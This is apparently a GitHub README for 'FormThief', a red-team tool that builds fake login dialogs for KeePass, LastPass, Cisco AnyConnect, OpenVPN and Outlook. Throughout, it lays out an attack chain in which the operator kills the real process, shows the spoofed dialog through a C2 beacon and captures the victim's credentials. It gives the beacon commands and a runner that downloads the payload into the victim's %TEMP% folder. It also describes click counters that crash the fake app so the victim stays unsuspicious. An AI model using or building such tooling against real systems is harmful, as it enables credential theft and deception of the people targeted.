# FormThief

FormThief is a project designed for spoofing Windows desktop login applications using WinForms and WPF. Below is an example run for KeePass (additional examples can be found in the 'Demos' folder):

[FormThief-KeePass.webm](https://github.com/mlcsec/FormThief-NewTest/assets/47215311/6a903ea2-1cc4-4039-a7fc-8ecc9415d693)


<br>

## Introduction

Windows Forms (WinForms) and Windows Presentation Foundation (WPF) are two powerful UI frameworks provided by Microsoft for building desktop applications on the Windows platform. While they are primarily used for developing software, they also offer a unique opportunity for spoofing login functions for legitimate Windows desktop applications.

The idea behind this was to identify desktop applications used by the target organisation, tailor a malicious forms application to the specific victim, then load the spoofed login application via beacon to capture user credentials. 

- [Cisco AnyConnect](#cisco-anyconnect)
- [KeePass](#keepass)
- [LastPass](#lastpass)
- [OpenVPN](#openvpn)
- [Windows Security (Outlook)](#windows-security-outlook)

I'm working on several others and will keep adding to this repo. Bitwarden is nearly finished; however, I encountered limitations with WinForms when replicating Bitwarden and LastPass. I will be porting both to WPF as soon as possible.

Improvements could  be made to incorporate greater application functionality, I've only attempted to replicate the processes necessary to capture user credentials. If users are persistant in trying to access other areas of the application I've added click counters which will trigger an exit or 'crash' the app so the victim doesn't become too suspicious when things aren't working as they normally would.

<br>

## Prereqs

Information on application process executables, prereqs for creating convincing dialogs, and example attack vectors:

| Application          | Executables | Prereqs | Example Attack Vector
|:-------------         |:--------------------|:---------------|:---------------|
| Cisco AnyConnect     | vpnui.exe/vpnagent.exe  | procsearch ui process for "Connected", should show 'Connected to xyz...' . <br><br>An XML file located in `C:\ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\Profile\` should also contain available hostnames/gateways for the host | Identify the current connection gateway -> kill process -> pop new auth dialog with identified gateway |
| KeePass              | KeePass.exe               | Identify any .kdbx files on the host (trying to dump the active .kdbx db with procsearch fails) | Kill process -> pop new auth dialog with .kdbx file path|
| LastPass              | lpwinmetro.exe              | procsearch LastPass process for "email" to identify active email address | Kill process -> pop new auth dialog with identified email|
| OpenVPN                      | openvpn.exe       |  procsearch OpenVPN process for ".ovpn" to identify active profile | Kill process -> pop new auth dialog with target VPN profile|
| Windows Security (Outlook)   | OUTLOOK.exe/olk.exe       | procsearch Outlook process for "email" to identify active email address | Kill process -> pop new auth dialog with extracted email|

Functionality within the included applications is fairly modular so it can be easily copy/pasted when creating new forms. Several items in [proctools](https://github.com/mlcsec/proctools), which was created whilst working on this project, may also come in handy.

<br>

# Usage

Clone the repo. Load the target application solution. Allow unsafe code and untick Prefer 32-bit. Build.

All applications except Windows Security (Outlook) work via [inlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly) and [bofnet_executeassembly](https://github.com/williamknows/BOF.NET). I've inlcuded a simple C# script (wpfRunner.cs) for downloading the WPF Outlook.exe to the victim's `%TEMP%` and executing directly from the host, not ideal but it works fine. Will update with a workaround.

> NOTE: Only tested on Windows 10, NOT tested on Windows 11

All code confirmed working locally and via beacon at time of release. Please don't hesitate to reach out with any issues or contributions.

## Cisco AnyConnect

```
beacon> inlineExecuteAssembly --dotnetassembly C:\Tools\CiscoAnyConnect.exe --assemblyargs "target.vpn.hostname"
```
```
beacon> bofnet_executeassembly CiscoAnyConnect target.vpn.hostname
```
![image](https://github.com/mlcsec/FormThief-NewTest/assets/47215311/963da32b-413a-46cc-b8e2-815aa4daa718)


## KeePass

```
beacon> inlineExecuteAssembly --dotnetassembly C:\Tools\KeePass.exe --assemblyargs "C:\path\to\target\passwords.kdbx"
```
```
beacon> bofnet_executeassembly KeePass "C:\path\to\target\passwords.kdbx"
```

![image](https://github.com/mlcsec/FormThief-NewTest/assets/47215311/34072b92-0b37-48cc-8c70-e0d806ca15c6)


## LastPass

```
beacon> inlineExecuteAssembly --dotnetassembly C:\Tools\LastPass.exe --assemblyargs "victim@domain.com"
```
```
beacon> bofnet_executeassembly LastPass "victim@domain.com"
```

![image](https://github.com/mlcsec/FormThief-NewTest/assets/47215311/68626b1b-528b-4631-a882-f5e852367894)


## OpenVPN

```
beacon> inlineExecuteAssembly --dotnetassembly C:\Tools\OpenVPN.exe --assemblyargs "target.vpn.profile"
```
```
beacon> bofnet_executeassembly OpenVPN target.vpn.profile
```

![image](https://github.com/mlcsec/FormThief-NewTest/assets/47215311/11749727-cac9-4fe7-97db-331ae4a44975)


## Windows Security (Outlook)

ModernWpfUI and Costura.Fody used. Right click project > Manage NuGet Packages... 
- click the "restore" button at the top of the window and you should be good to go

Simple workaround for issues running via `inlineExecute-Assembly` or `bofnet_executeassembly`:

```
beacon> inlineExecuteAssembly --dotnetassembly C:\Tools\wpfRunner.exe --assemblyargs "victim@domain.com"
```

![image](https://github.com/mlcsec/FormThief-NewTest/assets/47215311/cf642b1a-3593-4a8c-9c13-6fb30ce1f3a9)


<br>

# Observations

Few things to consider when creating WinForms or WPF applications for engagements:

- If `inlineExecute-Assembly` doesn't 'finish' the beacon will likely die
  - `bofnet_executeassembly` tends to be safer as it will display any errors in output without killing the beacon
- WinForms tends to produce smaller binaries than WPF
  - considerably so if using ModernWpfUI or wpfui
- Styling and rendering of forms/dialogs may change from one OS to another so test thoroughly
  - also running locally on a host vs. running via inlineExecute or BOFNET on the same host may alter the appearance so check both ways 

<br>

# Todo

- [ ] Finish and upload Bitwarden WinForms version
  - also port to WPF
- [ ] Capture creds -> encrypt/encode -> send out to teamserver without touching disk
- [ ] Resource/memory deallocation/cleanup issues when running consecutively (need to debug)
  - Some applications may only work once from the current beacon process (creating a new beacon and running again works fine). It won't crash the beacon on consecutive attempts but the application may not load correctly on second run
- [ ] Workaround for STA errors when running WPF app via inlineExecute/BOFNET
  - tried implementing some workarounds for this but no luck yet, running directly from the host is easiest workaround at present
